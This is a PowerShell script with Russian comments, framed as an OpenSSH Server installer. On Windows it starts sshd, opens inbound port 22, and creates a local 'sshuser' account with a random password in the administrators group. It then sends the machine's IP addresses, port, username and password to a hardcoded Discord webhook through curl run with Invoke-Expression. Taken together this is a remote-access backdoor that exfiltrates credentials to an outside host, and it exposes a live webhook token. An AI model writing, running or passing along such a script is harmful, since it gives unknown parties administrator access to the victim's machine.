try {
    # Устанавливаем кодировку консоли и процесса на UTF-8
    $OutputEncoding = [System.Text.Encoding]::UTF8
    [Console]::OutputEncoding = $OutputEncoding

    $StopWatch = [system.diagnostics.stopwatch]::startNew()

    # Проверяем наличие curl
    function Install-CurlIfMissing {
        if (-not (Get-Command curl -ErrorAction SilentlyContinue)) {
            Write-Host "curl не найден, устанавливаем..." -ForegroundColor Yellow

            if ($IsLinux) {
                # Для Linux
                Write-Host "Устанавливаем curl через apt..." -ForegroundColor Green
                & sudo apt update
                & sudo apt install curl -y
            } else {
                # Для Windows
                Write-Host "Устанавливаем curl через winget..." -ForegroundColor Green
                & winget install curl
            }
        } else {
            Write-Host "curl уже установлен." -ForegroundColor Green
        }
    }

    # Устанавливаем curl, если его нет
    Install-CurlIfMissing

    # URL вебхука Discord
    $WebhookURL = 'https://discord.com/api/webhooks/1311849224886812702/dsmLjee1J1LmsF5oxFnj14QwPEcbKoZgsCnYcgEv-wdexA7rHko3ZR9Nquyd4cyRvaCs'

    # Функция отправки сообщения в Discord с правильной кодировкой через curl
    function Send-DiscordMessage($MessageContent) {
        $Message = @{
            content = $MessageContent
        }

        try {
            # Преобразуем сообщение в JSON
            $JsonBody = $Message | ConvertTo-Json -Depth 10 -Compress

            # Отправка через curl
            $curlCommand = "curl -X POST $WebhookURL -H 'Content-Type: application/json' -d '$JsonBody'"
            Invoke-Expression $curlCommand
        } catch {
            Write-Host "Не удалось отправить сообщение в Discord: $($Error[0])" -ForegroundColor Red
        }
    }

    # Отправляем стартовое сообщение
    Send-DiscordMessage "🚀 Начало установки OpenSSH Server..."

    # Устанавливаем SSH Server
    if ($IsLinux) {
        Send-DiscordMessage "💻 Обнаружена Linux-система. Устанавливаем OpenSSH Server..."
        & sudo apt install openssh-server -y
        Send-DiscordMessage "✅ OpenSSH Server установлен на Linux."
    } else {
        Send-DiscordMessage "🖥️ Обнаружена Windows-система. Устанавливаем OpenSSH Server..."
        Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
        Start-Service sshd
        Set-Service -Name sshd -StartupType 'Automatic'
        Send-DiscordMessage "✅ OpenSSH Server установлен и запущен на Windows."

        # Настроим firewall, если правило нет
        if (-not (Get-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
            Send-DiscordMessage "🔒 Настроено правило firewall для SSH."
        } else {
            Send-DiscordMessage "🛡️ Правило firewall для SSH уже существует."
        }
    }

    # Генерируем случайный пароль
    $Password = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 12 | ForEach-Object { [char]$_ })
    Send-DiscordMessage "🔑 Сгенерирован пароль: `$Password"

    # Добавляем пользователя для подключения (только Windows)
    if (-not $IsLinux) {
        $Username = "sshuser"
        net user $Username $Password /add
        net localgroup administrators $Username /add
        Send-DiscordMessage "👤 Создан пользователь: $Username."
    }

    # Получаем основной IP-адрес
    $IPAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { 
        $_.InterfaceAlias -notmatch "Loopback" -and 
        $_.IPAddress -notlike "169.254.*" -and 
        $_.IPAddress -notlike "192.168.56.*" 
    }).IPAddress -join ", "
    Send-DiscordMessage "🌐 IP-адрес устройства: $IPAddress"

    # Настройки порта
    $Port = 22
    Send-DiscordMessage "⚙️ Порт SSH: $Port"

    # Итоговое сообщение
    [int]$Elapsed = $StopWatch.Elapsed.TotalSeconds
    Send-DiscordMessage "✅ OpenSSH Server успешно установлен за $Elapsed секунд!`nIP: $IPAddress`nPort: $Port`nUser: $Username`nPassword: $Password"

} catch {
    $ErrorMessage = "⚠️ Ошибка в строке $($_.InvocationInfo.ScriptLineNumber): $($Error[0])"
    Send-DiscordMessage $ErrorMessage
} finally {
    Send-DiscordMessage "🛑 Установка завершена. Нажмите любую клавишу для выхода."
    Pause
}
